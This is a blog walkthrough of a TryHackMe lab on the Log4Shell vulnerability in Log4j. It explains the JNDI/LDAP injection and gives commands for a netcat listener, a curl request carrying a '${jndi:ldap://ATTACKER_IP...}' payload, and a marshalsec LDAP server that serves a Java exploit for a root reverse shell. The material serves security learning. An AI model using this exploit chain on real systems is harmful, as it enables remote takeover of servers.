## What's Going On?

A new exploit has just been discovered that has been causing an uproar in the
cyber security community (as well as most companies). CVE-2021-44228, or **Log4Shell**,
is an exploit that takes advantage of a vulnerability in the Log4j library by
allowing the ability of remote code execution from unauthorized users.


## Overview of Log4j

Let's back up a bit and understand the library with the catastrophic vulnerability: **Log4j**.
The Log4j library is a logging tool for Java that utilizes Java Naming and Director Interface (JDNI) and
Lightweight Directory Access Protocol (LDAP) protocols. JNDI is the protocol that retrieves data
from a remote server and LDAP is the protocol used for communication to a server such as a database.

By using a JNDI lookup to the LDAP server, it was possible to return an object containing code that can be executed
on the victim's server. That means something like a reverse shell can be performed to gain complete control over the
server. That's it... a simple injection attack that was powerful enough to cause chaos and rated the one of the most dangerous
vulnerabilities ever discovered.

## TryHackMe Demo

To get an idea of how easy this exploit is to perform, we can look at a lab that demonstrates the
attack. I follow along <a href="https://tryhackme.com/room/solar"> John Hammond's TryHackMe Lab </a> and encourage everyone to try it out themselves,
but I'll still go through it if you're feeling lazy.

### Reconnaissance

After reading the introduction, we go into reconnaissance which is a fancy word for gathering information.
To begin, we must understand what ports are open on this machine by using **nmap**. We are looking for a service running
on port 8983 which can be found using the following command:

```
$ nmap -sV -p8983 [MACHINE_IP]
```

### Discovery

This section wants us to explore the url and log files that have been given to us, so let's take a
look. When clicking on the link, we open a very minimal web interface that clearly shows log4j is used.
The first question asks for the argument that -Dsolr.log.dir is set to which is seen on the front
page as **/var/solr/logs**.

The next three questions involve us looking at the task files which are logs. Download the given files
and we quickly see one file has a significantly higher number of INFO entries than the
others: **solr.log**. Among these requests, we see a path to **/admin/cores** and **params**={} which can
be an entrypoint where a user could control.

### Proof of Concept

There's a great explanation in this section of the syntax and where the vulnerability can be exploited.
By performing a JNDI lookup with external resources (i.e. untrusted data), the LDAP server retrieves
the lookup and allows the attacker to execute remote code.

Afterwards, the tasks want us to test for vulnerabilities in the system. Use either of
the following commands to view our own attacking machine IP address.
```
$ ip addr show
```
```
$ ifconfig
```
For those unfamiliar with interface configuration (ifconfig), we just need to check
our VPN interface which is labeled tun0. The specific address we need is inet which
will be needed to make our request later (ATTACKER_IP).

Now prepare our netcat listener on port 9999 with the following command:
```
$ nc -lnvp 9999
```
In a separate terminal, we can make a request with curl with the following command (replace
the necessary parts being the machine IP and attacker IP):
```
$ curl 'http://(MACHINE_IP):8983/solr/admin/cores?foo=$\{jndi:ldap://(ATTACKER_IP):9999\}'
```
Netcat should catch the connection and produce some weird symbols. We have verified a connection and
can move onto the next section.

### Exploitation

The part we've all been waiting for... the exploit itself. This section begins by explaining
how the JNDI and LDAP protocols work together to retrieve a lookup resource. An HTTP server will
host our malicious file where the LDAP server will retrieve and execute (which can easily be set up using
python3). This part can get a little messy, so I've organized steps into what we need to do.

1. We will need Java 8 installed (specifically 1.8.0_181) which is relatively straightforward in the
description. Verify with `java -version`.
2. `git clone https://github.com/mbechler/marshalsec`
3. `sudo apt install maven`
4. ~/marshalsec $ `mvn clean package -DskipTests`
5. Copy and paste the Java exploit code and name it Exploit.java. Compile with `javac Exploit.java`

We have finished the prerequisites and can begin the exploit. I used 4 terminals for
the HTTP server, our netcat listener, LDAP server startup (marshalsec), and curl command to trigger the
exploit. Here are the steps I took:

1. Start LDAP server: ~/marshalsec
$ `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://(ATTACKER_IP):8000/#Exploit"`
2. Start the HTTP server with `python3 -m http.server` and make sure we're in the same directory with `Exploit.*`
3. Prepare a netcat listener to catch the reverse shell with `nc -lnvp 9999`
4. Finally, execute `curl 'http://10.10.183.116:8983/solr/admin/cores?foo=$\{jndi:ldap://(ATTACKER_IP):1389/Exploit\}'`

Type "whoami" in the netcat listener and we see that we have root access to the machine now.
All we did was trick the LDAP server to request a JNDI lookup to retrieve our malicious code which made me understand
how dangerously easy this exploit can be executed. 

## Conclusion

**Log4Shell** caused so much havoc not only due to its abundant presence across many companies,
but how easily an adversary can utilize such an attack. A list of some of the
more popular companies can be found <a href="https://github.com/YfryTchsGD/Log4jAttackSurface">here</a>.

The vulnerability was found in Minecraft that demonstrates the attack very well, so be sure to check out those videos.
There was also an interesting article discussing how workers were punished for not reporting the vulnerability to their
government first that you should check out. These links can be found down below in the references.
